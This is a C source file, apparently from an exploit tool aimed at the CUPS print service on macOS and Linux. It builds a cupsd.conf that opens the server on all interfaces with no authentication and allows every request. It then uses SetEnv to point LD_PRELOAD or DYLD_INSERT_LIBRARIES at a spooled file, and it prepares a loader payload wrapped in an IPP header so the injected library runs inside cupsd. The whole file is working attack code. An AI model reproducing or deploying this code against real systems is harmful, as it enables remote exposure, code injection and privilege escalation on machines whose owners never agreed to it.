#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "membuf.h"

#include "loader.h"

void append_log_level(mem_buf* buf, int debug) {
  if (debug) {
    // Debugging for testing purposes.
    mem_buf_append_string(buf, "LogLevel debug2\n", 0);
  } else {
    // Otherwise, don't log anything else.
    mem_buf_append_string(buf, "LogLevel none\n", 0);
  }
}

void append_location(mem_buf* buf) {
  // Allow all requests.
  mem_buf_append_string(buf, "<Location />\n", 0);
  mem_buf_append_string(buf, "  Order deny,allow\n", 0);
  mem_buf_append_string(buf, "</Location>\n", 0);
}

void append_max_clients(mem_buf* buf) {
  mem_buf_append_string(buf, "MaxClients 1024\n", 0);
}

void append_listen(mem_buf* buf, int target_os) {
  // Listen on all interfaces, not just localhost.
  mem_buf_append_string(buf, "Listen *:631\n", 0);
  switch (target_os) {
    case OS_MACOS:
      mem_buf_append_string(buf, "Listen /private/var/run/cupsd\n", 0);
      break;
  }
}

void append_auth(mem_buf* buf) {
  // No auth by default.
  mem_buf_append_string(buf, "DefaultAuthType None\n", 0);
}

void append_webinterface(mem_buf* buf) {
  // Web interface enabled.
  mem_buf_append_string(buf, "WebInterface Yes\n", 0);
}

void append_policy(mem_buf* buf, char* name) {
  mem_buf_append_string(buf, "<Policy ", 0);
  mem_buf_append_string(buf, name, 0);
  mem_buf_append_string(buf, ">\n", 0);
  mem_buf_append_string(buf, "  JobPrivateAccess default\n", 0);
  mem_buf_append_string(buf, "  JobPrivateValues default\n", 0);
  mem_buf_append_string(buf, "  SubscriptionPrivateAccess default\n", 0);
  mem_buf_append_string(buf, "  SubscriptionPrivateValues default\n", 0);
  mem_buf_append_string(buf, "  <Limit All>\n", 0);
  mem_buf_append_string(buf, "    Order deny,allow\n", 0);
  mem_buf_append_string(buf, "  </Limit>\n", 0);
  mem_buf_append_string(buf, "</Policy>\n", 0);
}

void append_policies(mem_buf* buf) {
  append_policy(buf, "default");
  append_policy(buf, "authenticated");
  append_policy(buf, "kerberos");
}

void append_loader_env_directives_osx(mem_buf* buf, int num_temp_files) {
  char tmp[4096];
  // mem_buf_append_string(buf, "SetEnv DYLD_FORCE_FLAT_NAMESPACE 1\n", 0);
  snprintf(tmp, sizeof(tmp), "SetEnv DYLD_INSERT_LIBRARIES /private/var/spool/cups/%08x\n", num_temp_files);
  mem_buf_append_string(buf, tmp, 0);
}

void append_loader_env_directives_linux(mem_buf* buf, int num_temp_files) {
  char tmp[4096];
  snprintf(tmp, sizeof(tmp), "SetEnv LD_PRELOAD /var/spool/cups/%08x\n", num_temp_files);
  mem_buf_append_string(buf, tmp, 0);
}

void append_loader_env_directives(mem_buf* buf, int target_os, int num_temp_files) {
  switch (target_os) {
    case OS_MACOS:
      append_loader_env_directives_osx(buf, num_temp_files);
      break;
    case OS_LINUX:
      append_loader_env_directives_linux(buf, num_temp_files);
      break;
  }
}

void get_cupsd_conf_osx(mem_buf* buf, int num_temp_files) {
  append_log_level(buf, 1);
  append_listen(buf, OS_MACOS);
  append_auth(buf);
  append_webinterface(buf);
  append_max_clients(buf);
  append_location(buf);
  append_policies(buf);
  append_loader_env_directives(buf, OS_MACOS, num_temp_files);
}

void get_cupsd_conf_linux(mem_buf* buf, int num_temp_files) {
  append_log_level(buf, 1);
  append_listen(buf, OS_LINUX);
  append_auth(buf);
  append_webinterface(buf);
  append_max_clients(buf);
  append_location(buf);
  append_policies(buf);
  append_loader_env_directives(buf, OS_LINUX, num_temp_files);
}

void get_cupsd_conf(mem_buf* buf, int target_os, int num_temp_files) {
  switch(target_os) {
    case OS_MACOS:
      get_cupsd_conf_osx(buf, num_temp_files);
      break;
    case OS_LINUX:
      get_cupsd_conf_linux(buf, num_temp_files);
      break;
  }
}

void get_loader_payload_osx(mem_buf* buf, int target_arch) {
  switch (target_arch) {
    case ARCH_IA32:
    case ARCH_X64:
    case ARCH_UNIVERSAL:
      mem_buf_read_file(buf, kLoaderPayloadOsx);
      break;
  }
}

void get_loader_payload_linux(mem_buf* buf, int target_arch) {
  switch (target_arch) {
    case ARCH_IA32:
      mem_buf_read_file(buf, kLoaderPayloadLinuxIA32);
      break;
    case ARCH_X64:
      mem_buf_read_file(buf, kLoaderPayloadLinuxX64);
      break;
  }
}

void get_loader_payload(mem_buf* buf, int target_os, int target_arch) {
  // Tack on an IPP header.
  mem_buf_append_repeated_char(buf, 0, 8);
  mem_buf_append_char(buf, 3);
  switch (target_os) {
    case OS_MACOS:
      get_loader_payload_osx(buf, target_arch);
      break;
    case OS_LINUX:
      get_loader_payload_linux(buf, target_arch);
      break;
  }
}
